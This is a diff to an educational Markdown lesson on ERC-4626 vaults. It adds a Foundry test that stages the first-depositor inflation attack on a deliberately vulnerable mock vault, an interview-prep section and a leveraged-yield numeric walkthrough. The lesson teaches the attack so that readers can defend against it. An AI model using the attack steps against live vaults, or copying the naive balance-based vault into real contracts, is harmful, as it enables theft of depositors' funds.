@@ -19,6 +19,7 @@
 
 **The Inflation Attack and Defenses**
 - [The Attack](#inflation-attack)
+- [Quick Try: Inflation Attack in Foundry](#inflation-quick-try)
 - [Defense 1: Virtual Shares and Assets](#defense-virtual-shares)
 - [Defense 2: Dead Shares](#defense-dead-shares)
 - [Defense 3: Internal Accounting](#defense-internal-accounting)
@@ -30,11 +31,13 @@
 - [Allocator Vault Mechanics](#allocator-mechanics)
 - [The Curator Model](#curator-model)
 - [Read: Yearn V3 Source](#read-yearn-v3)
+- [Job Market: Yield Aggregation](#yield-aggregation-jobs)
 
 **Composable Yield Patterns and Security**
 - [Yield Strategy Comparison](#yield-strategies)
 - [Pattern 1: Auto-Compounding](#auto-compounding)
 - [Pattern 2: Leveraged Yield](#leveraged-yield)
+- [Deep Dive: Leveraged Yield Numeric Walkthrough](#leveraged-yield-walkthrough)
 - [Pattern 3: LP + Staking](#lp-staking)
 - [Security Considerations for Vault Builders](#vault-security)
 
@@ -246,7 +249,7 @@ Step 5: Alice withdraws everything
 - Withdrawals don't change the exchange rate for remaining holders
 - This is **exactly** how aTokens, cTokens, and LP tokens work under the hood
 
-**Rounding in practice:** In the example above, we used clean numbers. In reality, `1100 × 3000 / 3300 = 999.999...` which rounds down to 999 shares. Carol gets slightly fewer shares than expected. This rounding loss is typically negligible (< 1 wei of the underlying), but it accumulates vault-favorably — the vault slowly builds a tiny surplus that protects against rounding-based exploits.
+**Rounding in practice:** The example above used numbers that divide evenly, but real values rarely do. If Carol deposited 1,099 USDC instead, she'd get `1099 × 3000 / 3300 = 999.09...` which rounds down to 999 shares — slightly fewer than the "fair" amount. This rounding loss is typically negligible (< 1 wei of the underlying), but it accumulates vault-favorably — the vault slowly builds a tiny surplus that protects against rounding-based exploits.
 
 <a id="read-oz-erc4626"></a>
 ### 📖 Read: OpenZeppelin ERC4626.sol
@@ -341,6 +344,94 @@ The inflation attack (also called the donation attack or first-depositor attack)
 
 The attack works because the large donation inflates the exchange rate, and the subsequent deposit rounds down to give the victim far fewer shares than their deposit warrants.
 
+<a id="inflation-quick-try"></a>
+💻 **Quick Try:**
+
+Run this Foundry test to see the inflation attack in action. It deploys a naive vault and executes all 4 steps:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract MockUSDC is ERC20 {
+    constructor() ERC20("USDC", "USDC") {
+        _mint(msg.sender, 1_000_000e6);
+    }
+    function decimals() public pure override returns (uint8) { return 6; }
+}
+
+/// @notice Naive vault — no virtual shares, totalAssets = balanceOf
+contract NaiveVault is ERC20 {
+    IERC20 public immutable asset;
+    constructor(IERC20 _asset) ERC20("Vault", "vUSDC") { asset = _asset; }
+
+    function totalAssets() public view returns (uint256) {
+        return asset.balanceOf(address(this));  // ← THE VULNERABILITY
+    }
+
+    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
+        uint256 supply = totalSupply();
+        shares = supply == 0 ? assets : (assets * supply) / totalAssets();
+        asset.transferFrom(msg.sender, address(this), assets);
+        _mint(receiver, shares);
+    }
+
+    function redeem(uint256 shares, address receiver) external returns (uint256 assets) {
+        assets = (shares * totalAssets()) / totalSupply();
+        _burn(msg.sender, shares);
+        asset.transfer(receiver, assets);
+    }
+}
+
+contract InflationAttackTest is Test {
+    MockUSDC usdc;
+    NaiveVault vault;
+    address attacker = makeAddr("attacker");
+    address victim = makeAddr("victim");
+
+    function setUp() public {
+        usdc = new MockUSDC();
+        vault = new NaiveVault(usdc);
+        usdc.transfer(attacker, 30_000e6);
+        usdc.transfer(victim, 20_000e6);
+    }
+
+    function test_inflationAttack() public {
+        // Step 1: Attacker deposits 1 wei
+        vm.startPrank(attacker);
+        usdc.approve(address(vault), type(uint256).max);
+        vault.deposit(1, attacker);
+
+        // Step 2: Attacker donates 10,000 USDC directly
+        usdc.transfer(address(vault), 10_000e6);
+        vm.stopPrank();
+
+        // Step 3: Victim deposits 20,000 USDC
+        vm.startPrank(victim);
+        usdc.approve(address(vault), type(uint256).max);
+        vault.deposit(20_000e6, victim);
+        vm.stopPrank();
+
+        // Check: victim got only 1 share (should have ~2,000)
+        assertEq(vault.balanceOf(victim), 1, "Victim got robbed — only 1 share");
+
+        // Step 4: Attacker redeems
+        vm.prank(attacker);
+        uint256 attackerReceived = vault.redeem(1, attacker);
+
+        console.log("Attacker spent:    10,000 USDC");
+        console.log("Attacker received:", attackerReceived / 1e6, "USDC");
+        console.log("Victim deposited:  20,000 USDC");
+        console.log("Victim can redeem:", vault.totalAssets(), "USDC (in vault)");
+    }
+}
+```
+
+Run with `forge test --match-test test_inflationAttack -vv`. Watch the attacker steal ~5,000 USDC from the victim in 4 steps.
+
 #### 🔍 Deep Dive: Inflation Attack Step-by-Step
 
 ```
@@ -413,9 +504,14 @@ WITH VIRTUAL SHARES (OpenZeppelin, offset = 3)
            = 20,000,000,000 × 1001 / 10,000,000,002
            = 2,001          ← victim gets ~2000 shares!
 
-  Attacker has 1 share, victim has 2,001 shares.
-  Attacker redeems: 1 × totalAssets / totalSupply ≈ 15 USDC
-  Attacker LOSS: ~10,000 USDC ← Attack is UNPROFITABLE
+  Attacker has 1 share, victim has 2,001 shares. totalSupply = 2,002.
+  totalAssets = 30,000,000,001 (10k donation + 20k deposit + 1 wei)
+
+  Attacker redeems 1 share (conversion also uses virtual shares/assets):
+    assets = 1 × (30,000,000,001 + 1) / (2,002 + 1000)
+           = 30,000,000,002 / 3,002
+           = 9,993,338  ← ~$10 USDC
+  Attacker LOSS: ~$9,990 USDC ← Attack is UNPROFITABLE
 ```
 
 **Why virtual shares work:** The 1000 virtual shares in the denominator mean the attacker's donation is spread across 1001 shares (1 real + 1000 virtual), not just 1. The attacker can't monopolize the inflated rate.
@@ -667,6 +763,30 @@ Each layer uses ERC-4626, so they compose naturally.
 
 **Don't get stuck on:** The Vyper syntax in VaultV3 (Yearn V3 vaults are written in Vyper, not Solidity). The logic maps directly to Solidity concepts — `@external` = `external`, `@view` = `view`, `self.variable` = `this.variable`. Focus on the architecture, not the syntax.
 
+<a id="yield-aggregation-jobs"></a>
+#### 💼 Job Market Context
+
+**What DeFi teams expect you to know about yield aggregation:**
+
+1. **"How would you design a multi-strategy vault from scratch?"**
+   - Good answer: "An ERC-4626 vault that holds a list of strategies, allocates debt to each, and pulls from them in order on withdrawal."
+   - Great answer: "I'd follow the allocator pattern: the vault is an ERC-4626 shell with an ordered strategy queue. Each strategy is also ERC-4626 for composability. Key design decisions: (1) debt management — who sets target allocations and how often; (2) withdrawal queue priority — which strategies to pull from first (idle → lowest-yield → most-liquid); (3) profit accounting — harvest reports go through a `process_report()` that separates profit from fees and unlocks profit linearly to prevent sandwich attacks; (4) loss handling — reduce share price proportionally rather than reverting."
+
+2. **"What's the difference between Yearn V3 and MetaMorpho?"**
+   - Good answer: "Both are ERC-4626 allocator vaults, but Yearn allocates across arbitrary strategies while MetaMorpho allocates across Morpho Blue lending markets."
+   - Great answer: "The key difference is the strategy universe: Yearn strategies can do anything (LP, leverage, restaking), so the vault manager has more flexibility but more risk surface. MetaMorpho is constrained to Morpho Blue markets — the curator picks which markets to allocate to and sets caps, but all the underlying lending logic is in Morpho Blue itself. This constraint makes MetaMorpho easier to reason about and audit. The trend is toward this modular stack: protocol layer (Morpho Blue) handles mechanics, curator layer (MetaMorpho) handles risk allocation."
+
+3. **"How do you prevent a vault manager from rugging depositors?"**
+   - Good answer: "Use a timelock on strategy changes and cap allocations per strategy."
+   - Great answer: "Defense in depth: (1) granular role system — separate who can add strategies vs who can allocate debt vs who can trigger reports; (2) strategy allowlists with timelocked additions — depositors see new strategies before funds flow; (3) per-strategy max debt caps to limit blast radius; (4) depositor-side `max_loss` parameter on withdrawal — revert if the vault is trying to return less than expected; (5) the Yearn V3 approach of requiring strategy contracts to be pre-audited and whitelisted."
+
+**Interview Red Flags:**
+- ❌ Thinking vault managers have unrestricted access to user funds (they shouldn't — debt limits and roles constrain them)
+- ❌ Not understanding profit unlocking (the #1 sandwich defense for yield vaults)
+- ❌ Confusing Yearn V2 and V3 architecture (V3's ERC-4626-native design is fundamentally different)
+
+**Pro tip:** The curator/vault-as-a-service model is the fastest-growing DeFi architectural pattern in 2025. Being able to articulate the trade-offs between Yearn V3 (flexible strategies, higher risk surface) vs MetaMorpho (constrained to lending, easier to audit) vs Euler V2 (modular with custom vault logic) signals you understand the current state of DeFi infrastructure.
+
 ### 🛠️ Exercise
 
 **Exercise:** Build a simplified allocator vault:
@@ -755,6 +875,80 @@ Net yield = (Supply APY × leverage) - (Borrow APY × (leverage - 1))
 Only profitable when supply APY + incentives > borrow APY, which is common when protocols distribute governance token rewards. The flash loan strategies from Module 5 make this achievable in a single transaction.
 
 **Risk:** Liquidation if collateral value drops. The strategy must manage health factor carefully and deleverage automatically if it approaches the liquidation threshold.
+
+<a id="leveraged-yield-walkthrough"></a>
+#### 🔍 Deep Dive: Leveraged Yield — Numeric Walkthrough
+
+```
+SETUP
+═════
+  Aave USDC market:
+    Supply APY:  3.0%
+    Borrow APY:  4.5%
+    AAVE incentive (supply + borrow): +2.0% effective
+    Max LTV: 80%
+
+  Starting capital: 10,000 USDC
+
+LOOP-BY-LOOP RECURSIVE BORROWING
+═════════════════════════════════
+
+  Loop 0: Deposit 10,000 USDC
+          Collateral: 10,000  |  Debt: 0  |  Effective exposure: 10,000
+
+  Loop 1: Borrow 80% → 8,000 USDC, re-deposit
+          Collateral: 18,000  |  Debt: 8,000  |  Exposure: 18,000
+
+  Loop 2: Borrow 80% of new 8,000 → 6,400 USDC, re-deposit
+          Collateral: 24,400  |  Debt: 14,400  |  Exposure: 24,400
+
+  Loop 3: Borrow 80% of 6,400 → 5,120 USDC, re-deposit
+          Collateral: 29,520  |  Debt: 19,520  |  Exposure: 29,520
+
+  ... converges to:
+  Loop ∞: Collateral: 50,000  |  Debt: 40,000  |  Leverage: 5×
+          (Geometric series: 10,000 / (1 - 0.8) = 50,000)
+
+  In practice, 3 loops gets you ~3× leverage. Flash loans skip looping
+  entirely — borrow the full target amount in one tx (see Module 5).
+
+APY CALCULATION AT 3× LEVERAGE (3 loops ≈ 29,520 exposure)
+═══════════════════════════════════════════════════════════
+
+  Supply yield:    29,520 × 3.0%  = +$885.60
+  Borrow cost:    19,520 × 4.5%  = -$878.40
+  AAVE incentive: 29,520 × 2.0%  = +$590.40  (on total exposure)
+  ─────────────────────────────────────────────
+  Net profit:                       $597.60
+  On 10,000 capital → 5.98% APY  (vs 5.0% unleveraged: 3% + 2%)
+
+WHEN IT GOES WRONG — RATE INVERSION
+════════════════════════════════════
+
+  Market heats up. Borrow APY spikes to 8%, incentives drop to 0.5%:
+
+  Supply yield:    29,520 × 3.0%  = +$885.60
+  Borrow cost:    19,520 × 8.0%  = -$1,561.60
+  AAVE incentive: 29,520 × 0.5%  = +$147.60
+  ─────────────────────────────────────────────
+  Net profit:                       -$528.40  ← LOSING MONEY
+
+  The strategy must monitor rates and deleverage automatically when
+  net yield turns negative. Good strategies check this on every harvest().
+
+HEALTH FACTOR CHECK
+═══════════════════
+
+  At 3× leverage (3 loops):
+    Collateral: 29,520 USDC  |  Debt: 19,520 USDC
+    LT = 86% for stablecoins on Aave V3
+    HF = (29,520 × 0.86) / 19,520 = 25,387 / 19,520 = 1.30 ✓
+
+  Since both collateral and debt are USDC (same asset), price movement
+  doesn't affect HF — the risk is purely rate inversion, not liquidation.
+  For cross-asset leverage (e.g., deposit ETH, borrow USDC), price
+  movement is the primary liquidation risk (see Module 5 walkthrough).
+```
 
 <a id="lp-staking"></a>
 ### 💡 Pattern 3: LP + Staking
@@ -952,6 +1146,10 @@ function depositIntoVault(IERC4626 vault, uint256 assets) external {
 
 5. **The allocator pattern is the future of DeFi.** Yearn V3, Morpho curators, Euler V2 vaults — the industry is converging on modular ERC-4626 vaults with pluggable strategies. Building and understanding this pattern prepares you for the current state of DeFi architecture.
 
+6. **Leveraged yield is profitable only when incentives exceed the borrow-supply spread.** Recursive borrowing amplifies both yield and cost. When incentives dry up or borrow rates spike, leveraged positions bleed money. Same-asset strategies (USDC/USDC) avoid liquidation risk but still face rate inversion.
+
+7. **The curator model separates infrastructure from risk management.** Protocol layer handles mechanics (lending, swaps), curator layer handles allocation (which markets, what caps, what risk parameters). This modular stack — each layer using ERC-4626 — is how production DeFi is being built in 2025-26.
+
 ---
 
 ## 🔗 Cross-Module Concept Links
@@ -960,12 +1158,12 @@ function depositIntoVault(IERC4626 vault, uint256 assets) external {
 
 | Source | Concept | How It Connects |
 |---|---|---|
-| **Part 1 §1** | `mulDiv` with rounding | Vault conversions use `Math.mulDiv` with explicit rounding direction — rounds down for deposits, up for withdrawals |
-| **Part 1 §1** | Custom errors | Vault revert patterns (`DepositExceedsMax`, `InsufficientShares`) use typed errors from §1 |
-| **Part 1 §2** | Transient storage | Reentrancy guard for vault deposit/withdraw uses transient storage pattern from §2 |
-| **Part 1 §5** | Fork testing | ERC-4626 Quick Try reads a live Yearn vault on mainnet fork — fork testing from §5 enables this |
-| **Part 1 §5** | Invariant testing | ERC-4626 property tests (a16z suite) use invariant/fuzz patterns from §5 |
-| **Part 1 §6** | Proxy / delegateCall | Yearn V3 TokenizedStrategy uses `delegateCall` to shared implementation — proxy pattern from §6 |
+| **Part 1 Section 1** | `mulDiv` with rounding | Vault conversions use `Math.mulDiv` with explicit rounding direction — rounds down for deposits, up for withdrawals |
+| **Part 1 Section 1** | Custom errors | Vault revert patterns (`DepositExceedsMax`, `InsufficientShares`) use typed errors from Section 1 |
+| **Part 1 Section 2** | Transient storage | Reentrancy guard for vault deposit/withdraw uses transient storage pattern from Section 2 |
+| **Part 1 Section 5** | Fork testing | ERC-4626 Quick Try reads a live Yearn vault on mainnet fork — fork testing from Section 5 enables this |
+| **Part 1 Section 5** | Invariant testing | ERC-4626 property tests (a16z suite) use invariant/fuzz patterns from Section 5 |
+| **Part 1 Section 6** | Proxy / delegateCall | Yearn V3 TokenizedStrategy uses `delegateCall` to shared implementation — proxy pattern from Section 6 |
 | **M1** | SafeERC20 | All vault deposit/withdraw flows use SafeERC20 for underlying token transfers |
 | **M1** | Fee-on-transfer tokens | Break naive vault accounting — balance-before-after check from M1 is required |
 | **M2** | MINIMUM_LIQUIDITY / dead shares | Uniswap V2's dead shares defense is the same pattern as Defense 2 (burn shares to `address(1)`) |
